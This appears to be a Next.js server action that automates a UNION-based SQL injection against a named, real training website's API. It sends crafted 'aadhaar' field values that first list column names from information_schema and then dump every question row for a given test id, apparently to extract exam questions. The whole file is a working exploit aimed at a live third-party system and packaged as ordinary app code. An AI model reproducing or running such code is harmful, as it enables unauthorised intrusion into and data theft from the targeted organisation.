"use server";

import { generateRepeatedInjectionSegment } from "@/functions/generate-injection";
import maxCols, { regColumns } from "./max-cols";

export default async function getQuestions({ db, tid }) {
  const maxColsCount = maxCols();

  let injection = generateRepeatedInjectionSegment(
    `${process.env.AADHAAR}' UNION SELECT COLUMN_NAME`,
    25,
  ).concat(
    `FROM information_schema.COLUMNS where TABLE_NAME='question' and TABLE_SCHEMA='${db}`,
  );

  const res = await fetch(
    "https://training.nielitagt.in/training/assets/api/check_details1.php",
    {
      method: "POST",
      body: JSON.stringify({
        aadhaar: injection,
      }),
    },
  );
  const data = await res.json();

  const questions_cols = data.slice(2).map((q) => q.id);

  const questions_cols_count = questions_cols.length;
  const remainingColumns = maxColsCount - questions_cols_count;

  if (remainingColumns <= 0) {
    throw new Error("Max columns reached");
  }

  injection = generateRepeatedInjectionSegment(
    `${process.env.AADHAAR}' UNION SELECT *`,
    remainingColumns,
  ).concat(`FROM ${db}.question where testid='${tid}`);

  const res2 = await fetch(
    "https://training.nielitagt.in/training/assets/api/check_details1.php",
    {
      method: "POST",
      body: JSON.stringify({
        aadhaar: injection,
      }),
    },
  );
  const data2 = await res2.json();

  const formattedQuestions = data2.slice(2).map((q, q_index) =>
    questions_cols.reduce((acc, col, index) => {
      acc[col] = q[regColumns()[index]];
      return acc;
    }, {}),
  );

  return [questions_cols, formattedQuestions];
}
